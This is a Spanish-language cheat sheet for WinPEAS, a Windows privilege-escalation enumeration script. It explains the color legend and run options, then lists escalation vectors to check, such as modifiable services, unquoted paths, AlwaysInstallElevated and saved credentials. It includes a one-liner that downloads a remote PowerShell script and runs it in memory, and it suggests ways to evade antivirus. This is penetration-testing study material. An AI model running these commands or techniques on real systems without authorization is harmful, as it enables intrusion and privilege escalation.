# WinPEAS - Windows Privilege Escalation Awesome Script

WinPEAS es el equivalente a LinPEAS pero para entornos Windows. Busca vectores de escalada de privilegios analizando servicios, registros, permisos de archivos, contraseñas guardadas en la caché, y configuraciones de Active Directory locales.

## Leyenda de Colores (IMPORTANTE)

- **<span style="color:#ff5252; font-weight:bold">Rojo sobre Amarillo</span>**: 99% de probabilidad de ser un vector de escalada de privilegios (¡Vulnerabilidad Crítica!).
- **<span style="color:#ff5252">Rojo</span>**: Tienes que investigar esto más a fondo. Puede ser información sensible o un vector real.
- **<span style="color:#a5d6ff">Azul Celeste</span>**: Información sobre el sistema y configuraciones generales (Usuarios, Grupos, Permisos estándar).
- **<span style="color:#7ee787">Verde</span>**: Configuraciones seguras.

## Ejecución Rápida

### Ejecutable (CMD/Powershell)
Descarga `winPEASany.exe` desde GitHub y ejecútalo directamente:
```cmd
winPEASany.exe
```

### Versión PowerShell (Sin tocar el disco duro)
Si tienes ejecución de código pero no puedes subir binarios:
```powershell
$wp=[System.Net.WebClient]::new().DownloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1'); Invoke-Expression $wp; Invoke-winPEAS
```

### Opciones Interesantes (Modo Binario)
- `cmd`: Búsquedas extra usando comandos nativos de Windows.
- `fast`: Omite búsquedas pesadas (como buscar contraseñas recursivamente en el disco).
- `domain`: Busca información extra de Active Directory.

## Secciones Críticas a Revisar
1. **System Information**: Revisa la versión del OS (¿Es vulnerable a PrintNightmare, PetitPotam, etc?).
2. **Users Information**: Revisa si tu usuario tiene el privilegio `SeImpersonatePrivilege` o `SeAssignPrimaryTokenPrivilege` (Vector para Potato Exploits como JuicyPotato/PrintSpoofer).
3. **Services (Modifiable Services)**: Servicios en los que tienes permisos para cambiar el `binPath` (la ruta del ejecutable). Puedes reemplazarlo por una reverse shell y reiniciar el servicio (usando `sc.exe`).
4. **Unquoted Service Paths**: Servicios cuya ruta no está entre comillas y tiene espacios (Ej: `C:\Program Files\App\app.exe`). Puedes crear un ejecutable en `C:\Program.exe`.
5. **AlwaysInstallElevated**: Si el registro marca esto en `1`, puedes crear un archivo `.msi` malicioso que se instalará como SYSTEM.
6. **AutoLogon / Credential Manager**: Contraseñas guardadas en texto claro en el registro o credenciales almacenadas en caché.
7. **SAM / SYSTEM Files**: Copias de seguridad de las bases de datos de contraseñas de Windows almacenadas en carpetas accesibles (Ej: `C:\Windows\Repair\`).

## Errores Comunes de WinPEAS
- **Demasiada Salida**: WinPEAS puede generar miles de líneas de salida si el servidor tiene muchos archivos. Trata de redirigir la salida a un archivo para leerlo con calma:
  ```cmd
  winPEASany.exe > C:\Temp\winpeas_out.txt
  ```
- **Falsos Positivos**: El color "Rojo" normal (no el rojo sobre amarillo) a menudo señala configuraciones predeterminadas de Windows que técnicamente son inseguras pero no son explotables directamente sin otra pieza del rompecabezas. Enfócate siempre en el Rojo sobre Amarillo primero.
- **Bloqueo por Antivirus**: Windows Defender flaggea a WinPEAS casi siempre. Si estás en un entorno con AV, usa la versión `winPEAS.bat` (batch script) que evade algunas detecciones básicas, o lanza comandos manuales como `whoami /priv` o `sc qc <servicio>`.
